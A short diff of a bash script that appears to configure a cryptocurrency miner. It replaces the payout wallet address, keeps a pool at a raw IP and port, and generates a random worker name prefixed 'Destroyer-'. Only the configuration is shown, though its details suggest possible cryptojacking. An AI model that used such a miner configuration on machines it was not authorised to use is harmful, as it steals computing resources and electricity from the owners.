@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # Wallet and pool config
-WALLET="49Gnqxp1kWfZuAnPjTLSwEcsnw1UMJXfGSiSMDzi6Gor2rS8t2T4Fh5XGan9G7GMUmXdcNPJN8QoJWri945CfNfVN1svdbR"
+WALLET="49zBKSwwzERho5ESFGZ3WBXjT6Pdgi92QJ2V8wYF26AAeoKWrrbuB5P7bDEPCM4TjnAzS5GU9bMvg5pUgT99J3f3EURo6H8"
 POOL="31.97.58.247:1122"
 WORKER="Destroyer-$(tr -dc A-Za-z0-9 </dev/urandom | head -c 6)"
 
